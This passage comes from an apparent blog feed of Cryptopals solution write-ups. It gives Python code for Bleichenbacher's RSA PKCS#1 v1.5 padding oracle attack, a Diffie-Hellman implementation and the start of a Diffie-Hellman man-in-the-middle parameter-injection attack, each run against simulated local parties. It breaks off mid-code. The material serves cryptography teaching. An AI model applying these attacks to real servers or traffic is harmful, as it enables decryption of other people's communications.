            max_r <span style="color:#f92672">=</span> (b <span style="color:#f92672">*</span> s <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B) <span style="color:#f92672">//</span> n

            <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> range(min_r, max_r <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
                l <span style="color:#f92672">=</span> max(a, ceil(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n, s))
                u <span style="color:#f92672">=</span> min(b, (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n) <span style="color:#f92672">//</span> s)

                <span style="color:#66d9ef">if</span> l <span style="color:#f92672">&gt;</span> u:
                    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Unexpected error: l &gt; u in step 3&#39;</span>)

                append_interval(M_new, l, u)

        <span style="color:#66d9ef">if</span> len(M_new) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Unexpected error: there are 0 intervals.&#39;</span>)

        M <span style="color:#f92672">=</span> M_new
        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rsa <span style="color:#f92672">=</span> RSA_PKCS1_Oracle(<span style="color:#ae81ff">256</span>)
m <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>PKCS1_Pad(message<span style="color:#f92672">.</span>encode())

c <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>encrypt(m)
<span style="color:#66d9ef">assert</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Ciphertext padding verified.&#34;</span>)
recovered_plaintext <span style="color:#f92672">=</span> padding_oracle_attack(c, rsa)
</code></pre></div><p><code>&gt; Ciphertext padding verified.</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-48-bleichenbachers-pkcs-15-padding-oracle-complete-case">Challenge 48: Bleichenbacher&rsquo;s PKCS 1.5 Padding Oracle (Complete Case)</h3>
<p><a href="https://cryptopals.com/sets/6/challenges/48">Link</a></p>
<blockquote>
<p>This is a continuation of challenge #47; it implements the complete BB'98 attack.<br>
Set yourself up the way you did in #47, but this time generate a 768 bit modulus.<br>
To make the attack work with a realistic RSA keypair, you need to reproduce step 2b from the paper, and your implementation of Step 3 needs to handle multiple ranges.<br>
The full Bleichenbacher attack works basically like this:</p>
<ul>
<li>Starting from the smallest &rsquo;s&rsquo; that could possibly produce a plaintext bigger than 2B, iteratively search for an &rsquo;s&rsquo; that produces a conformant plaintext.</li>
<li>For our known &lsquo;s1&rsquo; and &lsquo;n&rsquo;, solve m1=m0s1-rn (again: just a definition of modular multiplication) for &lsquo;r&rsquo;, the number of times we&rsquo;ve wrapped the modulus.</li>
<li>&lsquo;m0&rsquo; and &lsquo;m1&rsquo; are unknowns, but we know both are conformant PKCS#1v1.5 plaintexts, and so are between [2B,3B].</li>
<li>We substitute the known bounds for both, leaving only &lsquo;r&rsquo; free, and solve for a range of possible &lsquo;r&rsquo; values. This range should be small!</li>
<li>Solve m1=m0s1-rn again but this time for &lsquo;m0&rsquo;, plugging in each value of &lsquo;r&rsquo; we generated in the last step. This gives us new intervals to work with. Rule out any interval that is outside 2B,3B.</li>
<li>Repeat the process for successively higher values of &rsquo;s&rsquo;. Eventually, this process will get us down to just one interval, whereupon we&rsquo;re back to exercise #47.</li>
</ul>
<p>What happens when we get down to one interval is, we stop blindly incrementing &rsquo;s&rsquo;; instead, we start rapidly growing &lsquo;r&rsquo; and backing it out to &rsquo;s&rsquo; values by solving m1=m0s1-rn for &rsquo;s&rsquo; instead of &lsquo;r&rsquo; or &lsquo;m0&rsquo;. So much algebra! Make your teenage son do it for you! <em>Note: does not work well in practice</em></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> random
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;kick it, CC&#34;</span>
</code></pre></div><p>The implementation is modified a bit to include one more step, as directed by the question.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">padding_oracle_attack</span>(ciphertext: bytes, rsa: object):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Performs the padding oracle attack on RSA ciphertext.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># Setting initial values</span>
    
    (e, n) <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>pub
    k <span style="color:#f92672">=</span> (n<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># byte length</span>
    B <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>(<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> (k <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>))
    M <span style="color:#f92672">=</span> [(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)]
    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(ciphertext):
        <span style="color:#75715e">#Step 1 Blinding</span>
        <span style="color:#66d9ef">while</span> True:
            s <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
            c0 <span style="color:#f92672">=</span> (ciphertext <span style="color:#f92672">*</span> pow(s, e, n)) <span style="color:#f92672">%</span> n
            <span style="color:#66d9ef">if</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c0):
                <span style="color:#66d9ef">break</span>

    <span style="color:#66d9ef">else</span>:
        c0 <span style="color:#f92672">=</span> ciphertext
        
    <span style="color:#75715e"># Step 2 Searching for PKCS conforming messages</span>
    <span style="color:#66d9ef">while</span> True:
        <span style="color:#75715e"># 2a</span>
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            s <span style="color:#f92672">=</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B)
            <span style="color:#66d9ef">while</span> True:
                c <span style="color:#f92672">=</span> (c0 <span style="color:#f92672">*</span> pow(s, e, n)) <span style="color:#f92672">%</span> n
                <span style="color:#66d9ef">if</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c):
                    <span style="color:#66d9ef">break</span>
                s <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>

        <span style="color:#75715e">#2b</span>
        <span style="color:#66d9ef">elif</span> len(M) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
            <span style="color:#66d9ef">while</span> True:
                s <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
                c <span style="color:#f92672">=</span> (c0 <span style="color:#f92672">*</span> pow(s, e, n)) <span style="color:#f92672">%</span> n
                <span style="color:#66d9ef">if</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c):
                    <span style="color:#66d9ef">break</span>
        
        <span style="color:#75715e">#2c</span>
        <span style="color:#75715e"># Step 2.c: Searching with one interval left</span>
        <span style="color:#66d9ef">elif</span> len(M) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            a, b <span style="color:#f92672">=</span> M[<span style="color:#ae81ff">0</span>]

            <span style="color:#75715e"># Check if the interval contains the solution</span>
            <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> b:

                <span style="color:#75715e"># And if it does, return it as bytes</span>
                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> (a)<span style="color:#f92672">.</span>to_bytes((a<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)

            r <span style="color:#f92672">=</span> ceil(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (b <span style="color:#f92672">*</span> s <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B), n)
            s <span style="color:#f92672">=</span> ceil(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n, b)

            <span style="color:#66d9ef">while</span> True:
                c <span style="color:#f92672">=</span> (c0 <span style="color:#f92672">*</span> pow(s, e, n)) <span style="color:#f92672">%</span> n
                <span style="color:#66d9ef">if</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c):
                    <span style="color:#66d9ef">break</span>

                s <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
                <span style="color:#66d9ef">if</span> s <span style="color:#f92672">&gt;</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n) <span style="color:#f92672">//</span> a:
                    r <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
                    s <span style="color:#f92672">=</span> ceil((<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n), b)

        <span style="color:#75715e"># Step 3: Narrowing the set of solutions</span>
        M_new <span style="color:#f92672">=</span> []

        <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> M:
            min_r <span style="color:#f92672">=</span> ceil(a <span style="color:#f92672">*</span> s <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, n)
            max_r <span style="color:#f92672">=</span> (b <span style="color:#f92672">*</span> s <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B) <span style="color:#f92672">//</span> n

            <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> range(min_r, max_r <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
                l <span style="color:#f92672">=</span> max(a, ceil(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n, s))
                u <span style="color:#f92672">=</span> min(b, (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n) <span style="color:#f92672">//</span> s)

                <span style="color:#66d9ef">if</span> l <span style="color:#f92672">&gt;</span> u:
                    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Unexpected error: l &gt; u in step 3&#39;</span>)

                append_interval(M_new, l, u)

        <span style="color:#66d9ef">if</span> len(M_new) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Unexpected error: there are 0 intervals.&#39;</span>)

        M <span style="color:#f92672">=</span> M_new
        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rsa <span style="color:#f92672">=</span> RSA_PKCS1_Oracle(<span style="color:#ae81ff">768</span>)
m <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>PKCS1_Pad(message<span style="color:#f92672">.</span>encode())

c <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>encrypt(m)
<span style="color:#66d9ef">assert</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Ciphertext padding verified.&#34;</span>)
recovered_plaintext <span style="color:#f92672">=</span> padding_oracle_attack(c, rsa)
</code></pre></div><p><code>&gt; Ciphertext padding verified.</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


]]></content>
        </item>
        
        <item>
            <title>Set 5</title>
            <link>https://hexterisk.github.io/blog/posts/2020/04/02/set-5/</link>
            <pubDate>Thu, 02 Apr 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/04/02/set-5/</guid>
            <description>Refer to this repository for solution scripts and the IPython Notebook pertaining to the explanations here.
Challenge 33: Implement Diffie-Hellman Link
 For one of the most important algorithms in cryptography this exercise couldn&amp;rsquo;t be a whole lot easier.
Set a variable &amp;ldquo;p&amp;rdquo; to 37 and &amp;ldquo;g&amp;rdquo; to 5. This algorithm is so easy I&amp;rsquo;m not even going to explain it. Just do what I do.
Generate &amp;ldquo;a&amp;rdquo;, a random number mod 37.</description>
            <content type="html"><![CDATA[<p>Refer to this <a href="https://github.com/hexterisk/cryptopals-solutions">repository</a> for solution scripts and the IPython Notebook pertaining to the explanations here.</p>
<h3 id="challenge-33-implement-diffie-hellman">Challenge 33: Implement Diffie-Hellman</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/33">Link</a></p>
<blockquote>
<p>For one of the most important algorithms in cryptography this exercise couldn&rsquo;t be a whole lot easier.<br>
Set a variable &ldquo;p&rdquo; to 37 and &ldquo;g&rdquo; to 5. This algorithm is so easy I&rsquo;m not even going to explain it. Just do what I do.<br>
Generate &ldquo;a&rdquo;, a random number mod 37. Now generate &ldquo;A&rdquo;, which is &ldquo;g&rdquo; raised to the &ldquo;a&rdquo; power mode 37 &mdash; A = (g**a) % p.<br>
Do the same for &ldquo;b&rdquo; and &ldquo;B&rdquo;.<br>
&ldquo;A&rdquo; and &ldquo;B&rdquo; are public keys. Generate a session key with them; set &ldquo;s&rdquo; to &ldquo;B&rdquo; raised to the &ldquo;a&rdquo; power mod 37 &mdash; s = (B**a) % p.<br>
Do the same with A**b, check that you come up with the same &ldquo;s&rdquo;.<br>
To turn &ldquo;s&rdquo; into a key, you can just hash it to create 128 bits of key material (or SHA256 it to create a key for encrypting and a key for a MAC).<br>
Ok, that was fun, now repeat the exercise with bignums like in the real world. Here are parameters NIST likes:<br>
<strong>p:</strong><br>
<strong>ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024</strong><br>
<strong>e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd</strong><br>
<strong>3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec</strong><br>
<strong>6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f</strong><br>
<strong>24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361</strong><br>
<strong>c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552</strong><br>
<strong>bb9ed529077096966d670c354e4abc9804f1746c08ca237327fff</strong><br>
<strong>fffffffffffff</strong><br>
<strong>g: 2</strong><br>
This is very easy to do in Python or Ruby or other high-level languages that auto-promote fixnums to bignums, but it isn&rsquo;t &ldquo;hard&rdquo; anywhere.<br>
Note that you&rsquo;ll need to write your own modexp (this is blackboard math, don&rsquo;t freak out), because you&rsquo;ll blow out your bignum library raising &ldquo;a&rdquo; to the 1024-bit-numberth power. You can find modexp routines on Rosetta Code for most languages.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> random
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
p <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>
g <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
</code></pre></div><p>The math involved in <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">DHKE</a> is very straightforward. Wikipedia provides a simple explanation:</p>
<p>The protocol uses the <a href="https://en.wikipedia.org/wiki/Multiplicative_group_of_integers_modulo_n">multiplicative group of integers modulo</a> <em>p</em>, where <em>p</em> is <a href="https://en.wikipedia.org/wiki/Prime_number">prime</a>, and <em>g</em> is a <a href="https://en.wikipedia.org/wiki/Primitive_root_modulo_n">primitive root modulo</a> <em>p</em>. These two values are chosen in this way to ensure that the resulting shared secret can take on any value from <em>1</em> to <em>p</em>–1. Here is an example of the protocol, with non-secret values in blue, and secret values in <strong>red</strong>.</p>
<ol>
<li><a href="https://en.wikipedia.org/wiki/Alice_and_Bob">Alice and Bob</a> publicly agree to use a modulus <em>p</em> = 23 and base <em>g</em> = 5 (which is a primitive root modulo 23).</li>
<li>Alice chooses a secret integer <em><strong>a</strong></em> = 4, then sends Bob <em>A</em> = <em>g</em>_**a**_ mod _p_
<ul>
<li><em>A</em> = 5<strong>4</strong> mod 23 = 4</li>
</ul>
</li>
<li>Bob chooses a secret integer <em><strong>b</strong></em> = 3, then sends Alice <em>B</em> = <em>g</em>_**b**_ mod _p_
<ul>
<li><em>B</em> = 5<strong>3</strong> mod 23 = 10</li>
</ul>
</li>
<li>Alice computes <em><strong>s</strong></em> = <em>B</em>_**a**_ mod _p_
<ul>
<li><em><strong>s</strong></em> = 10<strong>4</strong> mod 23 = 18</li>
</ul>
</li>
<li>Bob computes <em><strong>s</strong></em> = <em>A</em>_**b**_ mod _p_
<ul>
<li><em><strong>s</strong></em> = 4<strong>3</strong> mod 23 = 18</li>
</ul>
</li>
<li>Alice and Bob now share a secret (the number 18).</li>
</ol>
<p><img src="/Cryptopals_Set_5/1_image.png" alt="&ldquo;exchange&rdquo;">
<em>The concept is that after all the computation involved, the two parties will end up with a common secret value.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DiffieHellman</span>():
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Implements the Diffie-Helman key exchange. Each class is a party, which has his secret key (usually
</span><span style="color:#e6db74">    referred to as lowercase a or b) shares the public key (usually referred to as uppercase A or B) and can
</span><span style="color:#e6db74">    compute the shared secret key between itself and another party, given their public key, assuming that
</span><span style="color:#e6db74">    they are agreeing on the same p and g.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    DEFAULT_G <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
    DEFAULT_P <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#39;ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b225&#39;</span>
                    <span style="color:#e6db74">&#39;14a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f4&#39;</span>
                    <span style="color:#e6db74">&#39;4c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc20&#39;</span>
                    <span style="color:#e6db74">&#39;07cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed5&#39;</span>
                    <span style="color:#e6db74">&#39;29077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff&#39;</span>, <span style="color:#ae81ff">16</span>)

    <span style="color:#66d9ef">def</span> __init__(self: object, g<span style="color:#f92672">=</span>DEFAULT_G, p<span style="color:#f92672">=</span>DEFAULT_P):
        self<span style="color:#f92672">.</span>g <span style="color:#f92672">=</span> g
        self<span style="color:#f92672">.</span>p <span style="color:#f92672">=</span> p
        self<span style="color:#f92672">.</span>_secret_key <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
        self<span style="color:#f92672">.</span>shared_key <span style="color:#f92672">=</span> None

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_public_key</span>(self: object) <span style="color:#f92672">-&gt;</span> int:
        <span style="color:#66d9ef">return</span> pow(self<span style="color:#f92672">.</span>g, self<span style="color:#f92672">.</span>_secret_key, self<span style="color:#f92672">.</span>p)

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_shared_secret_key</span>(self: object, other_party_public_key: int) <span style="color:#f92672">-&gt;</span> int:
        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>shared_key <span style="color:#f92672">is</span> None:
            self<span style="color:#f92672">.</span>shared_key <span style="color:#f92672">=</span> pow(other_party_public_key, self<span style="color:#f92672">.</span>_secret_key, self<span style="color:#f92672">.</span>p)
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>shared_key
</code></pre></div><p>Create public and private keys for Alice and Bob.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Alice</span>
a <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">100</span>)
A <span style="color:#f92672">=</span> (g<span style="color:#f92672">**</span>a) <span style="color:#f92672">%</span> p

<span style="color:#75715e"># Bob</span>
b <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">100</span>)
B <span style="color:#f92672">=</span> (g<span style="color:#f92672">**</span>b) <span style="color:#f92672">%</span> p
</code></pre></div><p>Verify that the final session key comes out to be the same at Alice and Bob&rsquo;s end.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">session_key_Alice <span style="color:#f92672">=</span> (B<span style="color:#f92672">**</span>a) <span style="color:#f92672">%</span> p
session_key_Bob <span style="color:#f92672">=</span> (A<span style="color:#f92672">**</span>b) <span style="color:#f92672">%</span> p

<span style="color:#66d9ef">assert</span> session_key_Alice <span style="color:#f92672">==</span> session_key_Bob
</code></pre></div><p>Verify that our DiffieHellman implementation works and two parties will agree on the same key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">client1 <span style="color:#f92672">=</span> DiffieHellman()
client2 <span style="color:#f92672">=</span> DiffieHellman()

<span style="color:#66d9ef">assert</span> client1<span style="color:#f92672">.</span>gen_shared_secret_key(client2<span style="color:#f92672">.</span>gen_public_key()) <span style="color:#f92672">==</span> client2<span style="color:#f92672">.</span>gen_shared_secret_key(client1<span style="color:#f92672">.</span>gen_public_key())
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-34-implement-a-mitm-key-fixing-attack-on-diffie-hellman-with-parameter-injection">Challenge 34: Implement a MITM key-fixing attack on Diffie-Hellman with parameter injection</h3>
<p><a href="https://cryptopals.com/sets/5/challenges/34">Link</a></p>
<blockquote>
<p>Use the code you just worked out to build a protocol and an &ldquo;echo&rdquo; bot. You don&rsquo;t actually have to do the network part of this if you don&rsquo;t want; just simulate that. The protocol is:<br>
<strong>A-&gt;B</strong><br>
Send &ldquo;p&rdquo;, &ldquo;g&rdquo;, &ldquo;A&rdquo;<br>
<strong>B-&gt;A</strong><br>
Send &ldquo;B&rdquo;<br>
<strong>A-&gt;B</strong><br>
Send AES-CBC(SHA1(s)[0:16], iv=random(16), msg) + iv<br>
<strong>B-&gt;A</strong><br>
Send AES-CBC(SHA1(s)[0:16], iv=random(16), A&rsquo;s msg) + iv<br>
(In other words, derive an AES key from DH with SHA1, use it in both directions, and do CBC with random IVs appended or prepended to the message).<br>
Now implement the following MITM attack:<br>
<strong>A-&gt;M</strong><br>
Send &ldquo;p&rdquo;, &ldquo;g&rdquo;, &ldquo;A&rdquo;<br>
<strong>M-&gt;B</strong><br>
Send &ldquo;p&rdquo;, &ldquo;g&rdquo;, &ldquo;p&rdquo;<br>
<strong>B-&gt;M</strong><br>
Send &ldquo;B&rdquo; <strong>M-&gt;A</strong><br>
Send &ldquo;p&rdquo; <strong>A-&gt;M</strong><br>
Send AES-CBC(SHA1(s)[0:16], iv=random(16), msg) + iv<br>
<strong>M-&gt;B</strong><br>
Relay that to B <strong>B-&gt;M</strong><br>
Send AES-CBC(SHA1(s)[0:16], iv=random(16), A&rsquo;s msg) + iv<br>
<strong>M-&gt;A</strong><br>
Relay that to A<br>
M should be able to decrypt the messages. &ldquo;A&rdquo; and &ldquo;B&rdquo; in the protocol &mdash; the public keys, over the wire &mdash; have been swapped out with &ldquo;p&rdquo;. Do the DH math on this quickly to see what that does to the predictability of the key.<br>
Decrypt the messages from M&rsquo;s vantage point as they go by.<br>
Note that you don&rsquo;t actually have to inject bogus parameters to make this attack work; you could just generate Ma, MA, Mb, and MB as valid DH parameters to do a generic MITM attack. But do the parameter injection attack; it&rsquo;s going to come up again.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> random
<span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
p <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>
g <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
</code></pre></div><p>The idea here is that the client sends <em>(p, g, A)</em> to the server, and the server responds with <em>B</em>. If you recall, <em>p</em> and <em>g</em> are the public agreed-upon parameters for the group prime and generator. <em>A</em> is the Client’s piece of the secret key, and <em>B</em> is the Server’s piece.</p>
<p>If an attacker replaces <em>A</em> and <em>B</em> with <em>p</em>, then both Client and Server will compute the key to be <code>pᵃ mod p  = pᵇ mod p = 0 = pᵃ mod p =pᵇ mod p = 0</code>. </p>
<p><em>0</em> is then hashed and used as the symmetric key for AES-encrypting messages, so the attacker can decrypt all the communications.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parameter_injection_attack</span>(alice: object, bob: object):
    block_size <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>block_size
    <span style="color:#75715e"># A -&gt; M</span>
    A <span style="color:#f92672">=</span> alice<span style="color:#f92672">.</span>gen_public_key()
    <span style="color:#75715e"># M -&gt; B</span>
    A <span style="color:#f92672">=</span> alice<span style="color:#f92672">.</span>p
    <span style="color:#75715e"># B -&gt; M</span>
    B <span style="color:#f92672">=</span> bob<span style="color:#f92672">.</span>gen_public_key()
    <span style="color:#75715e"># M -&gt; A</span>
    B <span style="color:#f92672">=</span> bob<span style="color:#f92672">.</span>p
    
    <span style="color:#75715e"># A -&gt; M</span>
    msg <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello there!&#34;</span>
    s_a <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(str(alice<span style="color:#f92672">.</span>gen_shared_secret_key(B))<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()[:AES<span style="color:#f92672">.</span>block_size]
    iv <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
    cipher_a <span style="color:#f92672">=</span> AES_CBC_encrypt(msg, iv, s_a) <span style="color:#f92672">+</span> iv
    
    <span style="color:#75715e"># M -&gt; B</span>
    
